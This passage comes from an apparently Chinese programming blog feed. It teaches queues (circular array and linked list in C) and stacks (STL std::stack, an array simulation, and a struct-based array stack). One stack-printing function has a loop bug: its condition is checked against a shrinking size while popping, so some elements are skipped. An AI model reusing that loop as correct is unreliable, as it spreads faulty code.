class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">QNode</span> *Queue;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">QNode</span>&#123;<br>ElementType Data[MaxSize];<br><span class="hljs-type">int</span> front;   <span class="hljs-comment">// 记录队头 </span><br><span class="hljs-type">int</span> rear;    <span class="hljs-comment">// 记录队尾 </span><br>&#125;;<br><br><span class="hljs-function">Queue <span class="hljs-title">CreateQueue</span><span class="hljs-params">()</span></span>;  <span class="hljs-comment">// 初始化队列 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddQ</span><span class="hljs-params">(Queue Q,ElementType item)</span></span>;  <span class="hljs-comment">//  入队</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Queue Q)</span></span>; <span class="hljs-comment">// 判断队列是否已满 </span><br><span class="hljs-function">ElementType <span class="hljs-title">DeleteQ</span><span class="hljs-params">(Queue Q)</span></span>;  <span class="hljs-comment">// 出队 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue Q)</span></span>; <span class="hljs-comment">// 判断队列是否为空 </span><br><br><span class="hljs-comment">// 初始化 </span><br><span class="hljs-function">Queue <span class="hljs-title">CreateQueue</span><span class="hljs-params">()</span></span>&#123;<br>Queue Q;<br>Q = (Queue)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> QNode));<br>Q-&gt;front = <span class="hljs-number">-1</span>;<br>Q-&gt;rear = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">return</span> Q;<br>&#125; <br><br><span class="hljs-comment">// 判断队列是否已满</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Queue Q)</span></span>&#123;<br> <span class="hljs-keyword">return</span> ((Q-&gt;rear<span class="hljs-number">+1</span>) % MaxSize == Q-&gt;front);<br>&#125;<br><br><span class="hljs-comment">// 入队 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddQ</span><span class="hljs-params">(Queue Q,ElementType item)</span></span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">IsFull</span>(Q))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列满&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123; <br>Q-&gt;rear = (Q-&gt;rear<span class="hljs-number">+1</span>) % MaxSize;<br>Q-&gt;Data[Q-&gt;rear] = item; <br>&#125;<br>&#125;<br><br><span class="hljs-comment">//判断队列是否为空</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue Q)</span></span>&#123;<br><span class="hljs-keyword">return</span> (Q-&gt;front == Q-&gt;rear);<br>&#125;<br> <br><span class="hljs-comment">// 出队</span><br><span class="hljs-function">ElementType <span class="hljs-title">DeleteQ</span><span class="hljs-params">(Queue Q)</span></span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">IsEmpty</span>(Q))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列空&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>Q-&gt;front = (Q-&gt;front<span class="hljs-number">+1</span>) % MaxSize;<br><span class="hljs-keyword">return</span> Q-&gt;Data[Q-&gt;front];<br>&#125;<br>&#125; <br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>Queue Q;<br>Q = <span class="hljs-built_in">CreateQueue</span>();<br><span class="hljs-built_in">AddQ</span>(Q,<span class="hljs-number">3</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3入队\n&quot;</span>);<br><span class="hljs-built_in">AddQ</span>(Q,<span class="hljs-number">5</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5入队\n&quot;</span>);<br><span class="hljs-built_in">AddQ</span>(Q,<span class="hljs-number">11</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;11入队\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出队\n&quot;</span>,<span class="hljs-built_in">DeleteQ</span>(Q));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出队\n&quot;</span>,<span class="hljs-built_in">DeleteQ</span>(Q));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-9c51fa20" role="button" aria-expanded="false" aria-controls="collapse-9c51fa20">        <div class="fold-arrow">▶</div>队列的链式存储实现      </div>      <div class="fold-collapse collapse" id="collapse-9c51fa20">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">QNode</span> *Queue;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>&#123;<br>ElementType Data;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *Next;<br>&#125;;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">QNode</span>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *rear;    <span class="hljs-comment">// 指向队尾结点 </span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *front;   <span class="hljs-comment">// 指向队头结点 </span><br>&#125;;<br><br><span class="hljs-function">Queue <span class="hljs-title">CreateQueue</span><span class="hljs-params">()</span></span>;  <span class="hljs-comment">// 初始化队列 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddQ</span><span class="hljs-params">(Queue Q,ElementType item)</span></span>;  <span class="hljs-comment">//  入队</span><br><span class="hljs-function">ElementType <span class="hljs-title">DeleteQ</span><span class="hljs-params">(Queue Q)</span></span>;  <span class="hljs-comment">// 出队 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue Q)</span></span>; <span class="hljs-comment">// 判断队列是否为空 </span><br><br><span class="hljs-comment">// 初始化 </span><br><span class="hljs-function">Queue <span class="hljs-title">CreateQueue</span><span class="hljs-params">()</span></span>&#123;<br>Queue Q;<br>Q = (Queue)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> QNode));<br>Q-&gt;front = <span class="hljs-literal">NULL</span>;<br>Q-&gt;rear = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> Q;<br>&#125;<br><br><span class="hljs-comment">// 是否为空 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue Q)</span></span>&#123;<br><span class="hljs-keyword">return</span> (Q-&gt;front == <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">// 入队</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddQ</span><span class="hljs-params">(Queue Q,ElementType item)</span></span>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *node;<br>node = (<span class="hljs-keyword">struct</span> Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>node-&gt;Data = item;<br>node-&gt;Next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span>(Q-&gt;rear==<span class="hljs-literal">NULL</span>)&#123;  <span class="hljs-comment">//此时队列空 </span><br>Q-&gt;rear = node;<br>Q-&gt;front = node;<br>&#125;<span class="hljs-keyword">else</span>&#123; <span class="hljs-comment">//不为空 </span><br>Q-&gt;rear-&gt;Next = node;  <span class="hljs-comment">// 将结点入队 </span><br>Q-&gt;rear = node;   <span class="hljs-comment">// rear 仍然保持最后 </span><br>&#125;<br>&#125; <br><br><span class="hljs-comment">// 出队</span><br><span class="hljs-function">ElementType <span class="hljs-title">DeleteQ</span><span class="hljs-params">(Queue Q)</span></span>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *FrontCell;<br>ElementType FrontElem;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">IsEmpty</span>(Q))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列空&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>FrontCell = Q-&gt;front;<br><span class="hljs-keyword">if</span>(Q-&gt;front == Q-&gt;rear)&#123; <span class="hljs-comment">// 队列中只有一个元素 </span><br>Q-&gt;front = Q-&gt;rear = <span class="hljs-literal">NULL</span>; <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>Q-&gt;front = Q-&gt;front-&gt;Next;<br>&#125;<br>FrontElem = FrontCell-&gt;Data;<br><span class="hljs-built_in">free</span>(FrontCell);<br><span class="hljs-keyword">return</span> FrontElem;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>Queue Q;<br>Q = <span class="hljs-built_in">CreateQueue</span>();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;入队5\n&quot;</span>); <br><span class="hljs-built_in">AddQ</span>(Q,<span class="hljs-number">5</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;入队4\n&quot;</span>); <br><span class="hljs-built_in">AddQ</span>(Q,<span class="hljs-number">4</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;入队3\n&quot;</span>); <br><span class="hljs-built_in">AddQ</span>(Q,<span class="hljs-number">3</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队%d\n&quot;</span>,<span class="hljs-built_in">DeleteQ</span>(Q));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队%d\n&quot;</span>,<span class="hljs-built_in">DeleteQ</span>(Q));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队%d\n&quot;</span>,<span class="hljs-built_in">DeleteQ</span>(Q));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,<span class="hljs-built_in">DeleteQ</span>(Q));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>队列</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Datastructures-栈</title>
    <link href="/dong.github/2024/09/08/Datastructures-%E6%A0%88/"/>
    <url>/dong.github/2024/09/08/Datastructures-%E6%A0%88/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>后进先出的数据结构，很常用</strong></p><span id="more"></span><h1 id="STL中的stack"><a href="#STL中的stack" class="headerlink" title="STL中的stack"></a>STL中的stack</h1><p><strong>C++的STL提供了stack，将写好的各种功能封装，通过stack容器，可以很方便地使用栈。</strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>STL 栈的应用      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(stack&lt;<span class="hljs-type">int</span>&gt; k)</span></span><br><span class="hljs-function"></span>&#123;<br>stack&lt;<span class="hljs-type">int</span>&gt;kk = k; <span class="hljs-comment">//复制一份出来用于遍历。</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈中元素有：&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt;= kk.<span class="hljs-built_in">size</span>();++ i)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,kk.<span class="hljs-built_in">top</span>());<br>kk.<span class="hljs-built_in">pop</span>();<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>stack&lt;<span class="hljs-type">int</span>&gt; k;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5入栈\n&quot;</span>);<br>k.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);<br><span class="hljs-built_in">print</span>(k);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;7入栈\n&quot;</span>);<br>k.<span class="hljs-built_in">push</span>(<span class="hljs-number">7</span>);<br><span class="hljs-built_in">print</span>(k);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;66入栈\n&quot;</span>);<br>k.<span class="hljs-built_in">push</span>(<span class="hljs-number">66</span>);<br><span class="hljs-built_in">print</span>(k);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,k.<span class="hljs-built_in">top</span>());<br>k.<span class="hljs-built_in">pop</span>();<br><span class="hljs-built_in">print</span>(k);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,k.<span class="hljs-built_in">top</span>());<br>k.<span class="hljs-built_in">pop</span>();<br><span class="hljs-built_in">print</span>(k);<br><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//思考一下，为什么想要遍历还要复制一份出来。</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/dong.github/images/0908-1.png"></div><div class="group-image-wrap"><img src="/dong.github/images/0908.png"></div></div></div><p><strong>这种用法在工程中常见。因为STL写好的栈，作为C++的重要工具，经过了高度优化，综合考虑了易用性、性能、安全性、扩展性、还能够自动管理内存，是比较成熟的技术。”因此，在可能的情况下，建议使用STL std::stack。“</strong></p><h1 id="数组模拟的stack"><a href="#数组模拟的stack" class="headerlink" title="数组模拟的stack"></a>数组模拟的stack</h1>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-dcdac752" role="button" aria-expanded="false" aria-controls="collapse-dcdac752">        <div class="fold-arrow">▶</div>算法编程 栈的应用      </div>      <div class="fold-collapse collapse" id="collapse-dcdac752">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> k[<span class="hljs-number">10</span>];<br><span class="hljs-type">int</span> pointer = <span class="hljs-number">-1</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈中元素有：&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt;= pointer;++ i)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,k[i]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5入栈\n&quot;</span>);<br>k[++pointer] = <span class="hljs-number">5</span>;<br><span class="hljs-built_in">print</span>();<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;7入栈\n&quot;</span>);<br>k[++pointer] = <span class="hljs-number">7</span>;<br><span class="hljs-built_in">print</span>();<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;66入栈\n&quot;</span>);<br>k[++pointer] = <span class="hljs-number">66</span>;<br><span class="hljs-built_in">print</span>();<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,k[pointer]);<br>pointer--;<br><span class="hljs-built_in">print</span>();<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,k[pointer]);<br>pointer--;<br><span class="hljs-built_in">print</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div><p><strong>这种写法在算法编程中常见，因为算法编程常常是小段程序，一般无需考虑安全性，扩展性，而是追求极致的速度。另一方面，算法编程中也不会在栈中存储太多数据，只是想用到栈这种先入后出的特性。所以，用数组模拟栈是个好办法，灵活，轻便。</strong></p><h1 id="栈的顺序表实现"><a href="#栈的顺序表实现" class="headerlink" title="栈的顺序表实现"></a>栈的顺序表实现</h1><h2 id="数组实现"><a href="#数组实现" class="headerlink" title="数组实现"></a>数组实现</h2>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-d727f8b0" role="button" aria-expanded="false" aria-controls="collapse-d727f8b0">        <div class="fold-arrow">▶</div>栈的实现 数组      </div>      <div class="fold-collapse collapse" id="collapse-d727f8b0">        <div class="fold-content">          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXN 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> maxsize 5</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Elementtype;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span> *<span class="hljs-title">Stack</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span>&#123;</span><br>Elementtype Data[MAXN];<br><span class="hljs-type">int</span> Top;<br>&#125;;<br><br>Stack <span class="hljs-title function_">CreateStack</span><span class="hljs-params">()</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">Isempty</span><span class="hljs-params">(Stack S)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">IsFull</span><span class="hljs-params">(Stack S)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(Stack S,Elementtype item)</span>;<br>Elementtype <span class="hljs-title function_">Pop</span><span class="hljs-params">(Stack S)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Print</span><span class="hljs-params">(Stack S)</span>;<br><br>Stack <span class="hljs-title function_">CreateStack</span><span class="hljs-params">()</span><br>&#123;<br>Stack S;<br>S = (Stack)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>S-&gt;Top = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">return</span> S;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(Stack S,Elementtype item)</span><br>&#123;<br><span class="hljs-keyword">if</span>(IsFull(S))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈满\n&quot;</span>);<br><span class="hljs-keyword">return</span> ;<br>&#125;<br>S-&gt;Top ++ ;<br>S-&gt;Data[S-&gt;Top] = item;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">IsFull</span><span class="hljs-params">(Stack S)</span><br>&#123;<br><span class="hljs-keyword">return</span> (S-&gt;Top == maxsize<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">Isempty</span><span class="hljs-params">(Stack S)</span><br>&#123;<br><span class="hljs-keyword">return</span> (S-&gt;Top == <span class="hljs-number">-1</span>);<br>&#125;<br>Elementtype <span class="hljs-title function_">Pop</span><span class="hljs-params">(Stack S)</span><br>&#123;<br><span class="hljs-keyword">if</span>(Isempty(S))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈空\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>Elementtype val = S-&gt;Data[S-&gt;Top];<br>S-&gt;Top--;<br><span class="hljs-keyword">return</span> val;<br>&#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Print</span><span class="hljs-params">(Stack S)</span><br>&#123;<br><span class="hljs-type">int</span> i;  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈内元素有: &quot;</span>);<br><span class="hljs-keyword">for</span> (i = S-&gt;Top; i &gt;= <span class="hljs-number">0</span>; i--) &#123;  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, S-&gt;Data[i]);  <br>&#125;  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);  <br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  void Print(Stack S) &#123;  </span><br><span class="hljs-comment">  Stack copy = CopyStack(S);  </span><br><span class="hljs-comment">  if (!copy) &#123;  </span><br><span class="hljs-comment">  printf(&quot;内存分配失败\n&quot;);  </span><br><span 